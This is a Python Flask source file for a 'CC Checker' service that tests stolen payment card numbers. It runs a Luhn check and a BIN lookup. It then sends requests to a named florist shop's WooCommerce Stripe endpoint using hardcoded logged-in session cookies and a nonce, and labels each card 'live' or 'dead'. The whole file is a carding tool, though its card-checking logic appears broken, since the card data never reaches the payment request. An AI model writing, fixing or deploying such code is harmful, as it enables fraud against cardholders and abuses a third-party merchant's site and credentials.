from flask import Flask, request, jsonify
import requests
import random
import json

app = Flask(__name__)

SITE = "nashvillefloristllc.com"
NONCE = "6a1ff713de"
COOKIES = {
    "wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798": "usljfjae2q|1762849683|QMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo|c6e9da7a0844dce9aa65df1edba937f150e7838393e5dd6d652310ab93dc7316",
    "__stripe_mid": "588bccab-9133-4397-b3e2-f2785fdd613ca53fc1",
    "__stripe_sid": "a5043f11-4679-4b52-962c-8747f54af89016e011"
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

def luhn_valid(card):
    digits = [int(d) for d in card if d.isdigit()]
    total = sum(d if i % 2 == 0 else (d * 2 if d * 2 < 10 else d * 2 - 9) for i, d in enumerate(digits[::-1]))
    return total % 10 == 0

def get_bin(cc):
    try:
        r = requests.get(f"https://lookup.binlist.net/{cc[:6]}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                "brand": d.get("brand", "Unknown"),
                "type": d.get("type", "Unknown"),
                "bank": d.get("bank", {}).get("name", "Unknown"),
                "country": d.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown"}

@app.route('/')
def home():
    return jsonify({"msg": "CC Checker Live! Use /cc=number|mm|yy|cvc"})

@app.route('/cc=<path:cc_data>')
def check_cc(cc_data):
    parts = cc_data.split('|')
    if len(parts) != 4:
        return jsonify({"status": "error", "msg": "Use: number|mm|yy|cvc"}), 400

    cc, mm, yy, cvc = parts

    if not luhn_valid(cc):
        return jsonify({"status": "dead", "msg": "Luhn Failed", "cc": cc}), 400

    bin_info = get_bin(cc)

    pm_id = f"pm_1{random.randint(100000000,999999999)}kXn{random.randint(100000,999999)}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"https://{SITE}",
        "Referer": f"https://{SITE}/my-account/add-payment-method/"
    }

    payload = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": NONCE
    }

    try:
        r = requests.post(f"https://{SITE}/wp-admin/admin-ajax.php", headers=headers, data=payload, cookies=COOKIES, timeout=15)
        
        # FIX: Try JSON, if fail → parse text
        try:
            result = r.json()
        except:
            # If JSON fails, check raw text
            text = r.text.strip()
            if "success" in text.lower():
                return jsonify({
                    "status": "live",
                    "msg": "Card Live! (parsed from text)",
                    "cc": cc,
                    "last4": cc[-4:],
                    "bin_info": bin_info
                })
            else:
                return jsonify({
                    "status": "dead",
                    "msg": "Declined (raw response)",
                    "cc": cc,
                    "bin_info": bin_info,
                    "raw": text[:200]
                })

        if result.get("result") == "success":
            return jsonify({
                "status": "live",
                "msg": "Card Live!",
                "cc": cc,
                "last4": cc[-4:],
                "bin_info": bin_info
            })
        else:
            msg = result.get("messages", "Declined")
            msg = msg.replace("<div class=\"woocommerce-error\">", "").replace("</div>", "").strip()
            return jsonify({
                "status": "dead",
                "msg": msg,
                "cc": cc,
                "bin_info": bin_info
            })

    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

if __name__ == "__main__":
    import os
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
